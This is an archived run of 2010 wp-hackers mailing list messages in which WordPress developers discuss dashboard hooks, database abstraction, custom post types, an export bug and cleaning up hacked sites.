Message-ID: <AANLkTinx0JEgVUkL2_CJgCv735YQ8Gc_RNCTNSEApVfg@mail.gmail.com>

Thanks, i'll check with other plugin function if it really a problem with
that particular plugin

On Fri, Jul 16, 2010 at 6:39 PM, Otto <otto at ottodestruct.com> wrote:

> On Fri, Jul 16, 2010 at 5:15 AM, SteeleR <steelerbg at gmail.com> wrote:
> > Hi.. i'm trying to add a new widget to the dashboard and the new widget
> is
> > actually getting its content from an already installed plugin. The
> problem
> > is that the wp_dashboard_setup is firing before the plugins are loaded so
> > the plugin function are non-existing..
>
> No, the wp_dashboard_setup function isn't called until well after the
> plugins are already loaded. Your problem must lie elsewhere, somehow.
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wordpress at santosj.name  Fri Jul 16 21:24:31 2010
From: wordpress at santosj.name (Jacob Santos)
Date: Fri, 16 Jul 2010 16:24:31 -0500
Subject: [wp-hackers] Active Record / ORM enhancements discussion for
	WPDB class
In-Reply-To: <92B48E5D-17EE-4833-B734-D7BE5143AFA1@ftwr.co.uk>
References: <AANLkTikR4V18km2YawETdGDGMoEdbGpD4fb5PZQ9wg3S@mail.gmail.com>
	<92B48E5D-17EE-4833-B734-D7BE5143AFA1@ftwr.co.uk>
Message-ID: <AANLkTim1Cjn8GJWt09ucMf19gr4-YBvIBDr6d8nU-jcU@mail.gmail.com>

Well part of it is whether we should continue working on EzSQL library
renamed to WPDB or if we should, at which time PHP5 is required, change to a
new library and adapt the WPDB class to that new library. This would require
minimal testing and provide backwards compatibility with minimal time,
effort, and testing. Also, the new library would be maintained by a
third-party with some (little to no) support from the WordPress team.

The reason I propose this is that a lot of the code within WordPress is
similar. Most of the database calls are CRUD in one form or another. Each
time a new API is proposed with new tables the same code has to be rewritten
to match the new requirements and table.

In some ways, the insert and update methods of WPDB were added to change
that, but what I suggest goes a little bit deeper. If you unify the codebase
on CRUD or BREAD or Browse (multiple rows), Retrieve (single row), Edit, Add
and Delete, then it will handle common SQL for you. Granted, the majority of
what the API does is far more complex than those simple queries, but it
unifies how it is done.

Also, when you can have a base iterator, it removes some complexity. The
advantages of Active Record are few and given what WordPress does, would
only be standardizing what WordPress currently does. It would also be adding
maybe one or two more methods to WPDB, until PHP5 comes around and Iterator
support can be added.

The magic I believe, is with ORM, and given the links between tables may
simplify certain things.

For example, you desire post metadata, well, using DMZ CodeIgniter, you
would do the following: $posts->posts_metadata->get(); and you would only
get the post metadata associated with the current post. Is it better than
the current API? Not yet, but when you have multiple interactions, it
becomes increasingly useful and saves quite a bit of code.

Using DMZ, you would save quite a bit of lines of code because the
relationships will create the joins for you, instead of requiring an API
method or function to exist that does the joins for you manually.

API should focus on the more advanced cases of handling what normal
programmers either don't want to keep coding, or many novice programmers
can't easily do. Or save time and make complex tasks easier.

Backwards compatibility is simple really, given a new API that is
encapsulated around the old code.

Really, given what I'm thinking about, we can continue the old 1.x branch of
EzSQL and fork to WPDB version 2. Also, sadly, we can extend it to where
another class handles the connection and query functions allowing for
another DB to be managed by just calling: $wpdb->change_db_adapter(new
My_PDO_WPDB_Adapter());. Requiring that anyone wanting to change DB support
by using an entirely new WPDB class didn't ever seem wise. The Active Record
and ORM generally also abstract the SQL away, allowing for independent DB
queries to be made. Even if the change_db_adapter() was made, the problem
would remain that the new DB adapter would have to change the hard coded
queries to fit with the new DB.

Depending on what exactly new features we want, then that should really
decide what decision is made. All of this can be added to WPDB, but I think
if ORM is requested that a third party library is used instead.

On Thu, Jul 15, 2010 at 2:40 PM, Peter Westwood <peter.westwood at ftwr.co.uk>
 wrote:

> Personally I find nothing broken or disruptive to use with what we have.
>

Here are three:
WPDB - Reason: God Object restricting database access to single DB.
WP_Rewrite -> WP -> WP_Query - Reason: Controller implementation dependent
on and primarily for WordPress.
Procedural CRUD redundant functions for each API (posts, taxonomy, metadata,
etc) - Reason: Design decisions early on forced primary focus on single
functions for each task.


> Time spent re-inventing what we have to use new wizz-bangs / patterns / ...
> that are now more accessible doesn't make keeping everything backward
> compatible easier - in fact it makes it harder.
>

I don't believe that is true. Once something is deprecated and uses the new
code, as long as the old behavior is maintained in the new code, then the
old code no longer is required to be maintained.



> Developer time is a limited resource even with the 100s of regular
> contributors - all that time is best spent on incremental improvements
> rather than re-inventing wheels
>

This is true. The inclusion of new code, regardless of how well it was
initially tested will require many more fixes and time allocated to it after
the first few releases. Also, given the initial release of the new feature,
enhancements from interested parties will also increase the time required to
maintain those patches flowing in.

Focusing instead on fixing the new feature as opposed to fixing bugs in old
features is a problem and has been a problem since long before I joined the
community. I don't see how one person spending time largely on these things
will require the entire portion of the available contributors. Most of the
new features only require a fraction of the available contributors
regardless and may even bring in new contributors looking to correct
problems.


> In you want to go a try working on a WordPress like project that is built
> from the ground up using these newer techniques then you might want to
> investigate Habari - alot of the good folks that work on that are WordPress
> alumin and I believe it has a similar flow but is much more 'PHP5'
>

Giving you the benefit of the doubt, because I believe you are being
facetious. If not, then I would ask that you give me the benefit of the
doubt and not give an elitist response before all the information is given.
It would be better just to say, "Yeah, I'm never going to support this,"
then to tell me to go away and play in that other sandbox.

Jacob Santos

From e at leau.net  Fri Jul 16 21:42:42 2010
From: e at leau.net (Edward de Leau)
Date: Fri, 16 Jul 2010 23:42:42 +0200
Subject: [wp-hackers]  Redirect Exploit
Message-ID: <AANLkTimJH1Nzn9y5j-lX8vQqpmQGxslMP6N8uFdRcuSe@mail.gmail.com>

I just found out that all my wp sites were a victim of:
http://wiki.mediatemple.net/w/WordPress_Redirect_Exploit

so IF that happens to you it will save you 2 hours looking for how and why
like me


-- 
Edward de Leau
http://populair.eu

From batmoo at gmail.com  Fri Jul 16 21:50:03 2010
From: batmoo at gmail.com (Mohammad Jangda)
Date: Fri, 16 Jul 2010 17:50:03 -0400
Subject: [wp-hackers] Adding field(s) before Title and post content on
	custom post type
In-Reply-To: <190052F5-7DAF-499E-8848-DCE03FDD8E81@newclarity.net>
References: <CBCF8459-2D70-475E-9C13-E588ABD28B27@codehooligans.com> 
	<190052F5-7DAF-499E-8848-DCE03FDD8E81@newclarity.net>
Message-ID: <AANLkTimw5b6cjxt2IwRRREJJx9PUHdFcLFYHbCvc4dXS@mail.gmail.com>

>
> For that matter I'd also like to see plugins be able to add new "supports"
> features for custom post types with a register_post_type_support() or
> similar.


I might be misreading what you want, but plugins can already add support for
custom features using add_post_type_support:

<?php
add_action( 'init', 'post_type_support_test' );

function post_type_support_test() {

echo '<p>Do Posts support Authors? ' . ( post_type_supports( 'post',
'author' ) ? 'yes' : 'no' );

echo '<p>Do Posts support Pancakes? ' . ( post_type_supports( 'post',
'pancakes' ) ? 'yes' : 'no' );

add_post_type_support( 'post', 'pancakes' );

echo '<p>Do Posts support Pancakes <em>now</em>? ' . ( post_type_supports(
'post', 'pancakes' ) ? 'yes' : 'no' );
}
?>

--
Mohammad Jangda
www.digitalize.ca | @mjangda

From mikeschinkel at newclarity.net  Sat Jul 17 05:08:31 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 17 Jul 2010 01:08:31 -0400
Subject: [wp-hackers] Adding field(s) before Title and post content on
	custom post type
In-Reply-To: <AANLkTimw5b6cjxt2IwRRREJJx9PUHdFcLFYHbCvc4dXS@mail.gmail.com>
References: <CBCF8459-2D70-475E-9C13-E588ABD28B27@codehooligans.com>
	<190052F5-7DAF-499E-8848-DCE03FDD8E81@newclarity.net>
	<AANLkTimw5b6cjxt2IwRRREJJx9PUHdFcLFYHbCvc4dXS@mail.gmail.com>
Message-ID: <F817E7D6-B235-415D-987C-5F5E236B96D4@newclarity.net>

On Jul 16, 2010, at 5:50 PM, Mohammad Jangda wrote:
>> For that matter I'd also like to see plugins be able to add new "supports"
>> features for custom post types with a register_post_type_support() or
>> similar.
> 
> I might be misreading what you want, but plugins can already add support for
> custom features using add_post_type_support:
> 
> <?php
> add_action( 'init', 'post_type_support_test' );
> 
> function post_type_support_test() {
> 
> echo '<p>Do Posts support Authors? ' . ( post_type_supports( 'post',
> 'author' ) ? 'yes' : 'no' );
> 
> echo '<p>Do Posts support Pancakes? ' . ( post_type_supports( 'post',
> 'pancakes' ) ? 'yes' : 'no' );
> 
> add_post_type_support( 'post', 'pancakes' );
> 
> echo '<p>Do Posts support Pancakes <em>now</em>? ' . ( post_type_supports(
> 'post', 'pancakes' ) ? 'yes' : 'no' );
> }
> ?>

True.  I was thinking of something more integrated, i.e. consider a site about movies, I might want to add an "actors" supports functionality:

register_post_type('movie',
	array(
		'label'        => 'Movie',
		'public'       => true,
		'show_ui'      => true,
		'query_var'    => 'movie',
		'supports'     => array(
			'title',
			'editor',
			'thumbnail',
			'actors',
		)
);

Yes, I can currently add "actors" to the list of supports, but nothing happens if I do.  And yes I can also cobble together various functionality that would emulate the support that we each might expect, i.e. a metabox, loading and saving the data, etc..  I was just expressing that it would be nice if inclusion of "actors" could automatically call an API to add "support" for actors. Aside from simplicity for the implementor one big potential benefit is greater robustness; the saving hooks are called in many contexts and if not written very carefully can have unexpected data corrupting side-effects in other contexts.

Earth-shattering functionality? No, just a small but nice evolution from where we are today.

-Mike

From wp-hackers at striderweb.com  Sat Jul 17 13:33:52 2010
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sat, 17 Jul 2010 08:33:52 -0500
Subject: [wp-hackers] wp_dashboard_setup execution time (after plugins)
In-Reply-To: <AANLkTilaDKKL7xMGZOCrw8149Ht76bCDO3itAMBkZQJH@mail.gmail.com>
References: <AANLkTilaDKKL7xMGZOCrw8149Ht76bCDO3itAMBkZQJH@mail.gmail.com>
Message-ID: <4D7860B9-6D0A-4FD4-A505-19731FC1AF9D@striderweb.com>


On Jul 16, 2010, at 5:15 AM, SteeleR wrote:

> add_action('wp_dashboard_setup', 'my_wp_dashboard_setup');

Just a wild-ass guess, but have you tried:

add_action('wp_dashboard_setup', 'my_wp_dashboard_setup', 11);

?

Stephen

From wp-hackers at striderweb.com  Sat Jul 17 15:31:42 2010
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sat, 17 Jul 2010 10:31:42 -0500
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <8237C753-4CD6-47FF-AEB4-B2F03B30697E@newclarity.net>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<7A285335-C7F7-49C1-B9CF-D8D1473FB587@codehooligans.com>
	<8237C753-4CD6-47FF-AEB4-B2F03B30697E@newclarity.net>
Message-ID: <19C8F010-DD50-4A25-A53C-9DCBCB81C0E9@striderweb.com>


On Jul 10, 2010, at 6:59 PM, Mike Schinkel wrote:

> If five people want to each build event plugins wouldn't be be great if they all settled on the same way to store the basic subset of information they all needed about events like naming of the custom fields for the date, venue, etc?  That way there would be a great likelihood of there being compatibility.

Not a bad idea, except for the whole "herding cats" element.  All you can really do is *encourage* certain behavior, and plugin devs will either do it or not.

A smart dev making a calendar plugin will throw in an API so that other plugins can interact and add functionality to it.  In turn the most flexible/powerful plugins will probably end up being the most popular.

(cue 1,000-post thread about plugin dependencies and sub-plugins!)

On Jul 12, 2010, at 7:39 AM, Michael Pretty wrote:

> As for future compatibility with core post types, I really hope that core doesn't ever add any more post types.  If anything, I'd prefer if posts and pages were no longer built in.  With custom post types and taxonomies, we have really opened up the types of web-apps for which WordPress can be the backbone.  Then posts and pages could be a core plugin automatically included in upgrades and installs.

I really like this idea.

Ideally, new post types will be in plugins only, and eventually Posts and Pages themselves should either move to Core Plugins or simply become optional.

On Jul 12, 2010, at 8:11 AM, Andrew Nacin wrote:

> They'll always be built in, but I'd like to see them become like any other
> post type (which includes the ability for another plugin to unregister them
> without the sky falling), and I imagine we'll be heading further in that
> direction in future releases. Same goes for tags and categories.

Welllll, Okay.  That works too.  I would prefer the former though.

And why no bundling of Core Plugins if they're as significant as, say "Posts and Pages post types"??)  So it hasn't been talked about.  Doesn't mean it shouldn't be talked about.  ;-)


On Jul 12, 2010, at 3:31 PM, Andrew Nacin wrote:

> just some additional food for
> thought:
> 
> I don't want my products/books/events to be wiped on an uninstall hook, as I
> worked hard to cultivate that data.


GREAT point.  We need to encourage plugin authors NOT to include the data itself in their plugins' uninstall routines.

A separate, explicit, "delete custom data" function, maybe -- but it should be impossible to trigger accidentally....


Stephen

From paul at codehooligans.com  Sat Jul 17 18:50:27 2010
From: paul at codehooligans.com (Paul)
Date: Sat, 17 Jul 2010 14:50:27 -0400
Subject: [wp-hackers] Problems with export on WP 3.0
Message-ID: <03BC41C3-92F4-4D5D-B86B-FF14359979EA@codehooligans.com>

The setup: 
WP 3.0 basic install. No installed plugins. Using the TwentyTen theme. Only the Post, Pages, Category, Tags created during the initial install process. Installed in local laptop environment. 

Problem:
Given the basic initial WP3.0 install when I attempt to run the export I receive the following PHP Warning

Warning: strip_tags() expects parameter 1 to be string, array given in /Users/codehooligans/www/htdocs/projects/WordPress/local.wp30.com/wp-includes/formatting.php on line 2773

I've done some tracing through the code. Seem the function wp_strip_all_tags() expects a string but in some instance the parameter is an array. Going up the function calls it appears to start in admin.php line 89 where the $_GET['taxonomy'] URL parameter is passed to sanitize_key(). Which in turn calls wp_strip_all_tags();

The issue is actually in the URL generated via the first screen (form) of the export. Below is my actual URL used. For some reason the 'category' Taxonomy is parameter is being passed in as a '[category]' which gets converted into an array. 

http://local.wp30.com/wp-admin/export.php?mm_start=all&mm_end=all&author=all&taxonomy%5Bcategory%5D=0&post_type=all&status=all&submit=Download+Export+File&download=true

From wp at andrewnacin.com  Sat Jul 17 22:04:40 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sat, 17 Jul 2010 18:04:40 -0400
Subject: [wp-hackers] Problems with export on WP 3.0
In-Reply-To: <03BC41C3-92F4-4D5D-B86B-FF14359979EA@codehooligans.com>
References: <03BC41C3-92F4-4D5D-B86B-FF14359979EA@codehooligans.com>
Message-ID: <AANLkTilz-aVMkHqX4l1yQnG-dCJVgUvUw9OwUk6aKPCT@mail.gmail.com>

On Sat, Jul 17, 2010 at 2:50 PM, Paul <paul at codehooligans.com> wrote:

> The setup:
> WP 3.0 basic install. No installed plugins. Using the TwentyTen theme. Only
> the Post, Pages, Category, Tags created during the initial install process.
> Installed in local laptop environment.
>
> Problem:
> Given the basic initial WP3.0 install when I attempt to run the export I
> receive the following PHP Warning
>
> Warning: strip_tags() expects parameter 1 to be string, array given in
> /Users/codehooligans/www/htdocs/projects/WordPress/
> local.wp30.com/wp-includes/formatting.php on line 2773
>
> I've done some tracing through the code. Seem the function
> wp_strip_all_tags() expects a string but in some instance the parameter is
> an array. Going up the function calls it appears to start in admin.php line
> 89 where the $_GET['taxonomy'] URL parameter is passed to sanitize_key().
> Which in turn calls wp_strip_all_tags();
>
> The issue is actually in the URL generated via the first screen (form) of
> the export. Below is my actual URL used. For some reason the 'category'
> Taxonomy is parameter is being passed in as a '[category]' which gets
> converted into an array.
>
>
> http://local.wp30.com/wp-admin/export.php?mm_start=all&mm_end=all&author=all&taxonomy%5Bcategory%5D=0&post_type=all&status=all&submit=Download+Export+File&download=true


Nice work tracking this down. I did the same about a month ago --
http://core.trac.wordpress.org/changeset/15308. Fixed in 3.0.1, which I
would think will hit the shelves this week.

From angelia at 10sexyapples.com  Sat Jul 17 22:53:16 2010
From: angelia at 10sexyapples.com (Angelia Baladon)
Date: Sat, 17 Jul 2010 15:53:16 -0700
Subject: [wp-hackers] Database Object Retrieval
Message-ID: <AANLkTil7wMRbLKDMNxMs_w7x63ar7l3c2VLLrk38UfEW@mail.gmail.com>

I'm wondering if anyone has an answer to a scenario that I am trying to
resolve, and haven't found any solutions for.

I have a custom post/content type called "lesson"

I have multiple custom taxonomies registered to this custom post/content
type in order to allow for filtering the lessons by art subject, academic
subject etc.

I also have (link/url/bookmark) resources that need to be assigned to these
same taxonomies in order to allow for a related resource area on the lesson.
The relations will be created by the shared taxonomies.

I had originally hand coded all of my custom content registrations and such,
but, decided that it would be best to use one of the plugins that was being
developed to handle this, so that there would be a gui in the back end.
After much research, I went with CMS Press. I was able to work with the
code, adjusting and updating it as development was being completed on 3.0,
but, now I've hit a wall.

In the code ( the add or edit taxonomy form area ), the list of object types
to select from (for registering the taxonomy for) is being created
dynamically with a for each ( get_post_types public = true ) statement. This
of course does not create an option to register a taxonomy for the link
object type.

I really don't want to have to back six months worth of work out of CMS
Press and hand code it again on my own so that I will be able to relate a
taxonomy to a link object type, so, I need to find a solution to this.

I'm thinking there should be a function call for objects that is not
exclusive to the posts table in the database. I've seen get_object_types
used, but, haven't found any documentation as to what it will actually
return etc..

If I can simply use this function, please do tell.

If anyone out there has any helpful advice, it would be greatly appreciated.

This is the code that I need to fix to bring in the link object type:

         <code>

<h3><?php _e('General Settings')?></h3>
            <table class="form-table">
                <tr valign="top">
                    <th scope="row"><?php _e('Related Object Types')?></th>
                    <td>


<?php foreach(get_post_types(null, 'objects') as $post_type): ?>

<?php if((isset($post_type->public) && $post_type->public) ||
in_array($post_type->name, array('post', 'page', 'attachment'))):?>

<input type="checkbox" id="object_types_<?php echo
esc_attr($post_type->name)?>" name="object_types[]" value="<?php echo
esc_attr($post_type->name)?>"<?php echo
$taxonomy->supports_post_type($post_type->name) ? ' checked="checked"' :
''?> />

<label for="object_types_<?php echo esc_attr($post_type->name)?>"><?php echo
$post_type->name?></label>



<br />
                            <?php endif; ?>
                        <?php endforeach; ?>
                    </td>
                </tr>
            </table>
            <p class="submit"><input type="submit" name="submit"
value="<?php esc_attr_e('Submit'); ?>" class="button-secondary" /></p>
        </form>
        <?php
    }

</code>

Thanks again to anyone who can help me with this~
Angie

From paul at codehooligans.com  Sat Jul 17 23:24:40 2010
From: paul at codehooligans.com (Paul)
Date: Sat, 17 Jul 2010 19:24:40 -0400
Subject: [wp-hackers] Problems with export on WP 3.0
In-Reply-To: <AANLkTilz-aVMkHqX4l1yQnG-dCJVgUvUw9OwUk6aKPCT@mail.gmail.com>
References: <03BC41C3-92F4-4D5D-B86B-FF14359979EA@codehooligans.com>
	<AANLkTilz-aVMkHqX4l1yQnG-dCJVgUvUw9OwUk6aKPCT@mail.gmail.com>
Message-ID: <516798EF-18FA-4BC2-BD8F-98C65F28DE10@codehooligans.com>

Oh nice! Thanks. 
On Jul 17, 2010, at 6:04 PM, Andrew Nacin wrote:

> On Sat, Jul 17, 2010 at 2:50 PM, Paul <paul at codehooligans.com> wrote:
> 
>> The setup:
>> WP 3.0 basic install. No installed plugins. Using the TwentyTen theme. Only
>> the Post, Pages, Category, Tags created during the initial install process.
>> Installed in local laptop environment.
>> 
>> Problem:
>> Given the basic initial WP3.0 install when I attempt to run the export I
>> receive the following PHP Warning
>> 
>> Warning: strip_tags() expects parameter 1 to be string, array given in
>> /Users/codehooligans/www/htdocs/projects/WordPress/
>> local.wp30.com/wp-includes/formatting.php on line 2773
>> 
>> I've done some tracing through the code. Seem the function
>> wp_strip_all_tags() expects a string but in some instance the parameter is
>> an array. Going up the function calls it appears to start in admin.php line
>> 89 where the $_GET['taxonomy'] URL parameter is passed to sanitize_key().
>> Which in turn calls wp_strip_all_tags();
>> 
>> The issue is actually in the URL generated via the first screen (form) of
>> the export. Below is my actual URL used. For some reason the 'category'
>> Taxonomy is parameter is being passed in as a '[category]' which gets
>> converted into an array.
>> 
>> 
>> http://local.wp30.com/wp-admin/export.php?mm_start=all&mm_end=all&author=all&taxonomy%5Bcategory%5D=0&post_type=all&status=all&submit=Download+Export+File&download=true
> 
> 
> Nice work tracking this down. I did the same about a month ago --
> http://core.trac.wordpress.org/changeset/15308. Fixed in 3.0.1, which I
> would think will hit the shelves this week.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From marvinc at gmail.com  Sun Jul 18 00:04:44 2010
From: marvinc at gmail.com (MarvinC)
Date: Sat, 17 Jul 2010 20:04:44 -0400
Subject: [wp-hackers] My WPMU site got hacked!!!
In-Reply-To: <001501cb247c$eed25ee0$cc771ca0$@com>
References: <AANLkTin_az0oV1p-CqBj2CsbufVRL8Gy9z_WnJEX6XeQ@mail.gmail.com>
	<001501cb247c$eed25ee0$cc771ca0$@com>
Message-ID: <AANLkTimBbP8edamrgXe-VE10xRbI9T0omjhyhEBSYuVg@mail.gmail.com>

Where must I go to backup the content?

On Thu, Jul 15, 2010 at 8:22 PM, Brian Layman <bulk at thecodecave.com> wrote:

> It looks like it is a simple defacement.  Deleting index.html will likely
> temporarily fix the problem. However, that does nothing to plug the hole.
> Your best bet is to delete all the files, reinstall the core WordPress
> files
> and restore from last week's backup of the wp-content. And then uninstall
> any plugins you don't HAVE to have and change the rights on  all of your
> files to 744.
>
> A hack can be fairly complex, but that's the basic procedure. A detailed
> slide by Brad Williams about fixing hacks can be found here:
>
> http://www.slideshare.net/williamsba/now-thats-what-i-call-wordpress-securit
> y-2010
>
> Or contact Brad Williams, myself or the wp-pro mailing list if you just
> want
> this fixed and want to move to a host that can prevent it from happening
> again.
>
> And don't worry, you're not alone in having this particular hack happen to
> your site http://www.zone-h.org/archive/notifier=Xa7m3d Just make sure you
> don't appear in the R column or get a gold star :)
>
> ______________________________________________
> Brian Layman
> eHermits, Inc.
> TheCodeCave.com / eHermitsInc.com / twitter.com/BrianLayman /
> facebook.com/eHermit
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From arlenbee at gmail.com  Sun Jul 18 00:14:57 2010
From: arlenbee at gmail.com (Arlen Beiler)
Date: Sat, 17 Jul 2010 20:14:57 -0400
Subject: [wp-hackers] My WPMU site got hacked!!!
In-Reply-To: <AANLkTimBbP8edamrgXe-VE10xRbI9T0omjhyhEBSYuVg@mail.gmail.com>
References: <AANLkTin_az0oV1p-CqBj2CsbufVRL8Gy9z_WnJEX6XeQ@mail.gmail.com> 
	<001501cb247c$eed25ee0$cc771ca0$@com>
	<AANLkTimBbP8edamrgXe-VE10xRbI9T0omjhyhEBSYuVg@mail.gmail.com>
Message-ID: <AANLkTikaLQ-w4FHEfWZ0Y1_-7Ui9luspufca2OBWnRJy@mail.gmail.com>

Do you have ftp access? If so, download a copy of the files to your
computer.

On Sat, Jul 17, 2010 at 8:04 PM, MarvinC <marvinc at gmail.com> wrote:

> Where must I go to backup the content?
>
> On Thu, Jul 15, 2010 at 8:22 PM, Brian Layman <bulk at thecodecave.com>
> wrote:
>
> > It looks like it is a simple defacement.  Deleting index.html will likely
> > temporarily fix the problem. However, that does nothing to plug the hole.
> > Your best bet is to delete all the files, reinstall the core WordPress
> > files
> > and restore from last week's backup of the wp-content. And then uninstall
> > any plugins you don't HAVE to have and change the rights on  all of your
> > files to 744.
> >
> > A hack can be fairly complex, but that's the basic procedure. A detailed
> > slide by Brad Williams about fixing hacks can be found here:
> >
> >
> http://www.slideshare.net/williamsba/now-thats-what-i-call-wordpress-securit
> > y-2010
> >
> > Or contact Brad Williams, myself or the wp-pro mailing list if you just
> > want
> > this fixed and want to move to a host that can prevent it from happening
> > again.
> >
> > And don't worry, you're not alone in having this particular hack happen
> to
> > your site http://www.zone-h.org/archive/notifier=Xa7m3d Just make sure
> you
> > don't appear in the R column or get a gold star :)
> >
> > ______________________________________________
> > Brian Layman
> > eHermits, Inc.
> > TheCodeCave.com / eHermitsInc.com / twitter.com/BrianLayman /
> > facebook.com/eHermit
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From bulk at thecodecave.com  Sun Jul 18 00:47:03 2010
From: bulk at thecodecave.com (Brian Layman)
Date: Sat, 17 Jul 2010 20:47:03 -0400
Subject: [wp-hackers] My WPMU site got hacked!!!
In-Reply-To: <AANLkTimBbP8edamrgXe-VE10xRbI9T0omjhyhEBSYuVg@mail.gmail.com>
References: <AANLkTin_az0oV1p-CqBj2CsbufVRL8Gy9z_WnJEX6XeQ@mail.gmail.com>	<001501cb247c$eed25ee0$cc771ca0$@com>
	<AANLkTimBbP8edamrgXe-VE10xRbI9T0omjhyhEBSYuVg@mail.gmail.com>
Message-ID: <002401cb2612$becb1c40$3c6154c0$@com>

>> My WPMU site got hacked!!!
> Where must I go to backup the content?

Unfortunately, if you need to ask that, it's too late to get a backup from
before you were hacked.  Mosts host only make "emergency" backups, in other
words, it can only be used when they've screwed something up.

A plugin like Backup Buddy might be your best bet for making running backups
from now on.

For now, you can take the minimalist approach to restoring the site and
delete index.html, and then if you are running 3.0 go to the upgrade tab and
select reinstall. If you are not on 3.0 yet, simply upgrading to 3.0 should
do the same work.

______________________________________________
Brian Layman
eHermits, Inc.
TheCodeCave.com?/?eHermitsInc.com?/?twitter.com/BrianLayman /
facebook.com/eHermit


From marvinc at gmail.com  Sun Jul 18 00:58:09 2010
From: marvinc at gmail.com (MarvinC)
Date: Sat, 17 Jul 2010 20:58:09 -0400
Subject: [wp-hackers] My WPMU site got hacked!!!
In-Reply-To: <002401cb2612$becb1c40$3c6154c0$@com>
References: <AANLkTin_az0oV1p-CqBj2CsbufVRL8Gy9z_WnJEX6XeQ@mail.gmail.com>
	<001501cb247c$eed25ee0$cc771ca0$@com>
	<AANLkTimBbP8edamrgXe-VE10xRbI9T0omjhyhEBSYuVg@mail.gmail.com>
	<002401cb2612$becb1c40$3c6154c0$@com>
Message-ID: <AANLkTim4-yQxmtXzuuSp0aAnImkKdkSXbCfmfFGXHnEu@mail.gmail.com>

There is or was no index.html for me to delete and I unfortunately hadn't
upgraded to 3.0. I was thinking about a restore and sent that email without
thinking in my frustrated state. I'm in phpMyadmin and have exported a copy
of the database to my pc. What I'm trying to figure out in the restore
process is whether I need to re-install the site with the multisites as I
had them. Meaning I had the following sites:
Main site
store.mainsite
photos.mainsite
community.mainsite - buddypress

tia

On Sat, Jul 17, 2010 at 8:47 PM, Brian Layman <bulk at thecodecave.com> wrote:

> >> My WPMU site got hacked!!!
> > Where must I go to backup the content?
>
> Unfortunately, if you need to ask that, it's too late to get a backup from
> before you were hacked.  Mosts host only make "emergency" backups, in other
> words, it can only be used when they've screwed something up.
>
> A plugin like Backup Buddy might be your best bet for making running
> backups
> from now on.
>
> For now, you can take the minimalist approach to restoring the site and
> delete index.html, and then if you are running 3.0 go to the upgrade tab
> and
> select reinstall. If you are not on 3.0 yet, simply upgrading to 3.0 should
> do the same work.
>
> ______________________________________________
> Brian Layman
> eHermits, Inc.
> TheCodeCave.com / eHermitsInc.com / twitter.com/BrianLayman /
> facebook.com/eHermit
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jeremy at visser.name  Sun Jul 18 05:50:40 2010
From: jeremy at visser.name (Jeremy Visser)
Date: Sun, 18 Jul 2010 15:50:40 +1000
Subject: [wp-hackers] Redirect Exploit
In-Reply-To: <AANLkTimJH1Nzn9y5j-lX8vQqpmQGxslMP6N8uFdRcuSe@mail.gmail.com>
References: <AANLkTimJH1Nzn9y5j-lX8vQqpmQGxslMP6N8uFdRcuSe@mail.gmail.com>
Message-ID: <4C429630.1090201@visser.name>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Edward de Leau said:
> I just found out that all my wp sites were a victim of:
> http://wiki.mediatemple.net/w/WordPress_Redirect_Exploit
> 
> so IF that happens to you it will save you 2 hours looking for how and why
> like me

Unfortunately that is only cleaning up the mess that the attacker did.
It does not remove the attack vector that was used to crack your site in
the first place, which is where you really want to be focusing your efforts.

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)

iEYEARECAAYFAkxCliUACgkQvs6Qqs8TxBpHkgCfTVGEC9KwJgDSnTjGLzg5ghPo
8PgAoJnzQozeW7jB7sJ+dBj25Agy1DuD
=HA5S
-----END PGP SIGNATURE-----

From cwj at gokboet.nu  Sun Jul 18 08:25:07 2010
From: cwj at gokboet.nu (Carina)
Date: Sun, 18 Jul 2010 10:25:07 +0200
Subject: [wp-hackers] Moving from Movabletype to Wordpress cuts entries and
	and titels
Message-ID: <4C42BA63.3010803@gokboet.nu>

Hi everyone.

I am totally new to Wordpress and I am trying to import blogs from MT to 
WP. It does not work. I am using the export feature from MT and import 
feature in WP but only parts of everything gets imported. Is there a way 
I can do this using the database or is there something that is just missing.

MT version is 4.34 and WP is the latest, 3

I need to preserve permalinks some way or another and I guess many of 
you have a great solution to this. All help is appreciated to a WP newbie :)

Thanks, Carina


From mailapera at gmail.com  Sun Jul 18 10:52:24 2010
From: mailapera at gmail.com (mailapera)
Date: Sun, 18 Jul 2010 12:52:24 +0200
Subject: [wp-hackers] How many plugins can a WP installation bare?
Message-ID: <AANLkTikdODASXf0so8eHTi0cA9DKv7YULTOtM6X_vEpc@mail.gmail.com>

How many plugins can a WP installation bare? What is a reasonable number?

From curtis at curtismchale.ca  Sun Jul 18 11:47:44 2010
From: curtis at curtismchale.ca (Curtis Work)
Date: Sun, 18 Jul 2010 07:47:44 -0400
Subject: [wp-hackers] How many plugins can a WP installation bare?
In-Reply-To: <AANLkTikdODASXf0so8eHTi0cA9DKv7YULTOtM6X_vEpc@mail.gmail.com>
References: <AANLkTikdODASXf0so8eHTi0cA9DKv7YULTOtM6X_vEpc@mail.gmail.com>
Message-ID: <C557FE5F-3BD5-4EBB-93DB-B0CF736556A9@curtismchale.ca>

Really this is more of a personal preference. I don't like using many plugins so I'd say 10 max. I know a number of people who feel comfortable running 50. I've never heard a real 'upper limit' discussed regarding number of running plugins. 

Curtis McHale
Http://www.curtismchale.com
604.751.3482

